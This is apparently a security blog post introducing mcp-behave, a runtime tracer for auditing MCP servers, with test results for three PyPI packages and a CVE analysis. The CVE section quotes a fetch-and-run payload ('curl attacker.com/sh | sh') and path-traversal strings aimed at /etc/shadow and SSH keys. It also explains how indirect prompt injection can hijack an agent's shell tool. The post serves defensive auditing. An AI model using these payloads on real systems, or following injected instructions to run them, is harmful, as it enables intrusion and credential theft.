Auditing Real-World MCP Servers with mcp-behave: A Ground-Truth Comparative Study

Tool descriptions are marketing copy. Why static registry scanners fail and how dynamic syscall auditing catches unconstrained shell access and network egress in production Model Context Protocol servers.

November 2026 10 min read Navid Mirnouri
Abstract

The Model Context Protocol (MCP) has rapidly emerged as the universal standard connecting Large Language Models to local databases, shell tools, and APIs. But today's server verification relies almost exclusively on static schema analysis — linters and registries checking description strings and parameter types. That creates a catastrophic blind spot: static analysis inspects what a server declares, never what it actually does at runtime. In this study, we run mcp-behave — an open-source, non-invasive runtime behavioral tracer — against real-world production MCP servers published on PyPI: Anthropic's official mcp-server-time (the safe baseline), mcp-server-fetch (network egress), and mcp-server-shell (unconstrained subprocess execution). We show how dynamic syscall interception intercepts undeclared network sockets and raw shell launches (/bin/sh) without requiring root permissions, analyze real-world vulnerabilities like CVE-2025-54073 and CVE-2025-53110, and outline why runtime verification is essential for agentic security.

1. The Core Problem: The MCP Privilege Gap

When a developer configures an MCP server in Claude Desktop, Cursor, or an autonomous CLI agent:

{
  "mcpServers": {
    "shell-helper": {
      "command": "python",
      "args": ["-m", "mcp_server_shell"]
    }
  }
}

That process does not run in a sandboxed browser environment or an isolated hypervisor by default. It executes locally with the developer's full operating system privileges. It inherits the developer's $HOME directory, SSH private keys in ~/.ssh, cloud tokens in ~/.aws/credentials, environment secrets (.env), and access to local network sockets.

In the MCP specification, servers communicate with the model over JSON-RPC via standard input/output or HTTP/SSE:

  • tools/list: Returns available tools, human-readable descriptions, and JSON Schemas.
  • tools/call: Executes a tool with model-synthesized arguments.

Why Static Schema Auditing Fails

Registry linters inspect the AST or the JSON manifest. They verify that types conform to JSON Schema Draft 7 and that docstrings are well-formed. However:

  1. Zero Runtime Visibility: A tool declaring itself "Purely local text formatting" can quietly open an outbound TCP socket to an external server or read credentials off disk without changing its manifest.
  2. The Prompt-Injection Multiplier: While a developer might assume an execution tool will only be used when they explicitly ask for it, an autonomous agent reading an untrusted webpage, a pull request diff, or a poisoned document can be hijacked via indirect prompt injection to trigger tools with attacker-chosen arguments.
  3. The Rug-Pull Threat: An open-source package published as version 0.1.0 with clean, benign tools can release version 0.1.1 with unconstrained command execution or telemetry probes without altering existing tool signatures.
The Fallacy of Declared Safety

Tool schemas and docstrings are marketing copy directed at the LLM planner. They provide zero programmatic guarantees about the system calls executed by the underlying runtime process.

2. Architecture of mcp-behave

To establish ground-truth observability without invasive kernel modules or root access, I built mcp-behave. It treats any MCP server as a black-box executable under test:

Target Server Command ──▶ Runtime Tracer Injected (DYLD / LD_PRELOAD) │ ▼ Autonomous Probe Engine ──▶ Query tools/list & resources/list │ ▼ Schema-Aware Canary Synthesis (RFC-reserved domains, min constraints, defaults) │ ▼ Dispatch tools/call over stdio ──▶ Intercept libc calls (F=open, N=connect, X=exec) │ ▼ Differential Policy Analyzer ──▶ Declared vs. Observed Verdict (Exit Code 0 vs >0)

Key Technical Pillars

  • Non-Invasive Syscall Interposition (No Root Required): On macOS, mcp-behave injects libmcpbehave_trace.dylib via DYLD_INSERT_LIBRARIES, interposing libc entry points (open, openat, connect, execve, execv, posix_spawn). On Linux, it injects libmcpbehave_trace.so via LD_PRELOAD (falling back to strace). Traces are written to a dedicated descriptor ($MCP_BEHAVE_TRACE_FILE), keeping stdout pristine for JSON-RPC traffic.
  • Schema-Aware Canary Synthesis: The probe engine reads the server's live JSON Schema and generates valid inputs respecting format (URI, email, date-time), minimum boundaries, and default values, injecting canary strings (canary-input, http://example.com/, /tmp/probe-canary.txt).
  • Differential Scope Analysis: Flags undeclared outbound network connects (elevated to HIGH severity if the tool description claims local/offline operation), detects reads to sensitive paths (~/.ssh, .env, .aws), alerts on subprocess launches, and checks cryptographic manifest hashes across runs to catch rug-pulls.

3. Auditing Real-World MCP Servers

Rather than testing synthetic fixtures, we evaluated three publicly published packages from the Python Package Index (PyPI):

  1. mcp-server-time (Anthropic Official Reference, v2026.11.11)
  2. mcp-server-shell (Community Terminal Helper, v0.1.0)
  3. mcp-server-fetch (Anthropic Official Reference, v2026.11.11)

Target A: The Safe Baseline (mcp-server-time)

Anthropic's mcp-server-time provides local timezone and offset conversions across three tools: get_current_time, convert_time, and get_time_ago.

$ mcp-behave /tmp/audit_env/bin/mcp-server-time

=== STEP 1: observe (macos-dylib) ===
[probe] discovered 3 tool(s)
[probe] calling tool get_current_time({"timezone": "Asia/Tehran"})
[probe] calling tool convert_time({"source_timezone": "Asia/Tehran", "time": "canary-input", "target_timezone": "Asia/Tehran"})
[probe] calling tool get_time_ago({"timezone": "Asia/Tehran", "days_ago": 0, "hours_ago": 0, "minutes_ago": 0, "seconds_ago": 0})
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: get_current_time, convert_time, get_time_ago
  resources:    0, prompts: 0
  declared scope hints: none
  --------------------------------------------------------
  no declared-vs-observed deviations detected

Inspecting trace.log reveals 572 total libc open() calls. 565 were filtered as standard runtime library noise (Python C-extensions and bytecode caches). The remaining 7 were legitimate OS timezone databases (/etc/timezone, /var/db/zoneinfo). Crucially:

  • Network Sockets: Exactly 0 (no connect() calls).
  • Subprocesses: Exactly 0 (no exec / posix_spawn calls).
  • Sensitive Files: Exactly 0 credential stores accessed.
  • Verdict: PASS (Clean) with exit code 0.

Target B: The High-Risk Privileged Target (mcp-server-shell)

Published on PyPI as mcp-server-shell==0.1.0, this server declares a single tool: execute_command({"command": "string"}) with description "Execute a shell command and return its output".

Inspecting the package's server.py reveals the underlying implementation:

class ShellServer:
    def execute_command(self, command: str) -> CommandResult:
        logger.info(f"Executing command: {command}")
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )
        return CommandResult(...)

The server wraps Python's subprocess.run(command, shell=True) with zero input sanitization or sandboxing boundaries. Running mcp-behave against this live package:

$ mcp-behave /tmp/audit_env/bin/python -m mcp_server_shell

=== STEP 1: observe (macos-dylib) ===
[probe] discovered 1 tool(s)
[probe] calling tool execute_command({"command": "canary-input"})
2026-11-18 09:07:41,349 - INFO - Executing command: canary-input
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: execute_command
  resources:    0, prompts: 0
  declared scope hints: none
  --------------------------------------------------------
  [i] INFO spawned subprocess: /bin/sh

In trace.log, mcp-behave captured the raw process spawn: X /bin/sh. The tool immediately broke out of the Python interpreter into an unconstrained host shell session. Coupled with indirect prompt injection, this tool transforms any web or document read into arbitrary Remote Code Execution (RCE) on the developer's laptop.

5. Real-World CVE Analysis in the Ecosystem

The security exposure demonstrated by mcp-server-shell is not theoretical. Across 2025 and 2026, critical vulnerabilities in published MCP servers demonstrated these exact attack paths:

CVE-2025-54073: Remote Code Execution in mcp-package-docs (npm)

An MCP server designed to fetch documentation for package managers passed package names directly into Node's child_process.exec() without sanitization. An attacker supplying a malicious payload in a README (e.g. react; curl attacker.com/sh | sh) achieved arbitrary command execution when the model queried the tool. Static scanners gave the package a clean grade because the tool schema simply declared package_name: string. Under mcp-behave, the tool's immediate spawn of /bin/sh is flagged on first exercise.

CVE-2025-53110: Path Traversal in Filesystem MCP Servers

Path traversal vulnerabilities allowed models to escape designated workspace directories using relative traversal sequences (../../../../etc/shadow or ../../.ssh/id_rsa). mcp-behave continuously monitors open() and openat() calls against sensitive directory paths (.ssh, id_rsa, .aws/credentials, .env), triggering a HIGH severity alert whenever a sensitive credential path is opened.

6. Engineering Deep-Dive: Tracing Subprocesses on macOS

During our audit of Python-based MCP servers on macOS Apple Silicon, we encountered a critical systems-level challenge in tracing child processes:

When Python calls subprocess.run(shell=True):

  1. Python invokes _posixsubprocess.fork_exec().
  2. In the forked child process, Python's runtime runs close_open_fds() to close all file descriptors above standard error (default close_fds=True).
  3. This action immediately closed the tracer's active log descriptor (g_trace_fd) inside the child process.
  4. When the subsequent execv or execve call fired, the write attempt failed silently with EBADF.

To eliminate dropped events, we updated macos_tracer.c and linux_tracer.c to detect descriptor invalidation and re-open the trace file atomically on append:

static void emit(const char *buf, size_t len) {
    if (g_trace_fd < 0) {
        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
        if (path && *path) g_trace_fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
    }
    if (g_trace_fd < 0) return;
    ssize_t w = write(g_trace_fd, buf, len);
    if (w < 0) {
        /* If write fails because child closed descriptors before exec, re-open */
        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
        if (path && *path) {
            int fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
            if (fd >= 0) {
                (void)!write(fd, buf, len);
                g_trace_fd = fd;
            }
        }
    }
}

This guarantees that every subprocess spawned by any runtime language (Python, Node.js, Go, Rust) is captured in the audit trace.

7. Recommendations for the MCP Ecosystem

As agentic AI transitions from experimental playgrounds to enterprise production, the trust model of tool connectivity must mature:

Actionable Guidelines

  • For Registries (Glama, Smithery, Official Registry): Integrate automated behavioral audits into ingestion CI pipelines. Replace cosmetic linting badges with verified behavioral facts: 0 network sockets observed, 0 subprocesses spawned, strict path isolation verified.
  • For Enterprise Security Teams: Mandate behavioral audits before allowing third-party MCP servers onto developer laptops. Run mcp-behave --json --fail-on high <command> in pre-commit hooks.
  • For MCP Authors: Implement explicit sandboxes, refuse shell expansion, and restrict network calls to declared domain allowlists.

Static schema verification guarantees syntactic validity; it says nothing about runtime integrity. Before connecting your next MCP tool to Claude Desktop or Cursor, don't just read the schema. Audit what it actually does.
